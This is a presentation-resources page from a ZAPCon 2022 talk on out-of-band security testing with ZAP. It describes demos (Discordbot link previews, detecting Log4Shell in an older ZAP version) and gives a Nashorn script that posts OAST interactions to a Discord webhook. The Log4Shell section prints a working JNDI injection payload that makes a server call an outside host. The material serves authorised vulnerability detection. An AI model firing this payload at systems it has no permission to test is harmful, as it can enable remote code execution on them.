---
layout: default
title: ZAPCon 2022 - OAST with ZAP
description: "Resources related to my presentation on \"OAST with ZAP\" at ZAPCon 2022."
image: "/assets/images/zapcon2022-social.png"
---

<style>
  .video-container {
    position: relative;
    width: 95%;
    height: 0;
    padding-bottom: 56.25%;
    margin: 20px auto;
  }

  .video {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
  }

  ul {
    list-style-type: none;
    display: table;
    margin: 0 auto;
    padding: 0;
    overflow: hidden;
    border: 1px solid #e7e7e7;
    background-color: #f3f3f3;
  }

  li {
    float: left;    
  }

  li a {
    display: block;
    color: #666;
    text-align: center;
    padding: 14px 16px;
    text-decoration: none;
  }

  li a:hover:not(.active) {
    background-color: #ddd;
  }

  li a.active {
    color: white;
    background-color: #04AA6D;
  }
</style>

<center>
    <img src="/assets/images/zapcon2022-logo.svg" width="200vw">
    <h1>OAST with ZAP - Presentation Resources</h1>
</center>

<ul>
  <li><a href="/zapcon2022/">Home</a></li>
  <li><a href="/zapcon2022/slides/">Slides</a></li>
  <li><a class="active" href="/zapcon2022/demos/">Demos</a></li>
  <li><a href="/zapcon2022/links">Links</a></li>
</ul>

<br>

## Finding Discordbot's Address
Ever wonder how chat apps display link previews? In this demo, a URL was constructed using an Interactsh payload and pasted into a Discord channel. Soon after, a GET request appeared in ZAP's OAST Tab and the request had "Discordbot" in it's User-agent header value.

<div class="video-container"><iframe class="video" src="https://www.youtube-nocookie.com/embed/LmBwakpiA5o" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

---

<br>

## Discovering Log4Shell in ZAP 2.11.0
A newer version of ZAP was used to discover Log4Shell in ZAP 2.11.0 by injecting a known Log4Shell payload in the `apikey` parameter of the `/JSON/alert/action/deleteAlert/` ZAP API endpoint. The payload used was `${jndi:ldap://{0}/abc}` where `{0}` was replaced by an Interactsh payload obtained from the OAST add-on.
<div class="video-container"><iframe class="video" src="https://www.youtube-nocookie.com/embed/e5q5GEkEIxM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

---

<br>

## OAST Interaction Discord Notifier
A ZAP script was used to demonstrate the capabilities of OAST request handlers. The script in the demo registered an OAST request handler to send messages to a Discord webhook whenever a new OAST interaction was received.

<div class="video-container"><iframe class="video" src="https://www.youtube-nocookie.com/embed/QrYUHeg98uQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

### ZAP Standalone Script Code (Nashorn)
You need a valid [Discord Webhook URL](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) for this script to work.

```js
// This script registers an OAST message handler that sends interactions to a Discord webhook.

var Control = Java.type("org.parosproxy.paros.control.Control")
var Model = Java.type("org.parosproxy.paros.model.Model")
var extOast = Control.getSingleton().getExtensionLoader().getExtension("ExtensionOast")
var interactsh = extOast.getInteractshService()
var HttpSender = Java.type("org.parosproxy.paros.network.HttpSender")
var HttpMessage = Java.type("org.parosproxy.paros.network.HttpMessage")
var HttpHeader = Java.type("org.parosproxy.paros.network.HttpHeader")
var HttpRequestHeader = Java.type("org.parosproxy.paros.network.HttpRequestHeader")
var URI = Java.type("org.apache.commons.httpclient.URI")
var discordWebHookUrl = new URI("<Replace with Discord Webhook URL>", true)

function requestHandler(request) {
    var msg = request.getHistoryReference().getHttpMessage()
    var formattedRequestHeader = "```\n" + (msg.getRequestHeader().toString() || "---") + "\n```"
    var formattedRequestBody = "```\n" + (msg.getRequestBody().toString() || "---") + "\n```"
    embed1 = {
        "title": "Interaction",
        "fields": [
            { "name": "Request Header", "value": formattedRequestHeader },
            { "name": "Request Body", "value": formattedRequestBody },
            { "name": "Source", "value": request.getSource() || "---", "inline": true },
            { "name": "Referer", "value": request.getReferer() || "---", "inline": true },
            { "name": "Handler", "value": request.getHandler() || "---", "inline": true }
        ]
    }
    var content = ":sparkles: New interaction received.\n"
    var body = { "content": content, "embeds": [embed1] }

    var requestMethod = HttpRequestHeader.POST;
    var msg = new HttpMessage()
    msg.setRequestHeader(new HttpRequestHeader(requestMethod, discordWebHookUrl, HttpHeader.HTTP11));
    msg.getRequestHeader().setHeader(HttpHeader.CONTENT_TYPE, HttpHeader.JSON_CONTENT_TYPE);
    msg.setRequestBody(JSON.stringify(body))
    var sender = new HttpSender(Model.getSingleton().getOptionsParam().getConnectionParam(), true, HttpSender.MANUAL_REQUEST_INITIATOR);
    sender.sendAndReceive(msg)
}

interactsh.addOastRequestHandler(requestHandler)
print("OAST Discord Notifier registered.")
```
